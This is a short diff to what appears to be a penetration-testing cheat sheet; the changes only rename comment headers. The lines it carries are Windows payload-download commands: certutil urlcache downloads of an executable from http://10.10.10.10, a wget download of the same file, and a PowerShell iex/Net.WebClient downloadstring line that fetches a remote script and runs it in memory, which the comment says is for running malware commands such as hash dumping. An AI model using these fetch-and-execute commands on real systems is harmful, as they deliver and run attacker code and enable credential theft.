@@ -1,7 +1,8 @@
+# Command line
 cmd.exe /C certutil  -split -urlcache -f http://10.10.10.10/exe.LOL c:\Users\Admin\Desktop\exe.lol
-#OR
+# Utilities
 certutil -urlcache -f http://10.10.10.10/lol.exe lol.exe
-#or
+# Command Line 
 wget http://10.10.10.10/lol.exe -outfile lol.exe
-#or (loaded into memory can then run commands from malware ie get-hash)
+# loaded into memory can then run commands from malware ie get-hash
 iex (New-Object Net.webclient).downloadstring('http://10.10.10.10/lol.ps1')
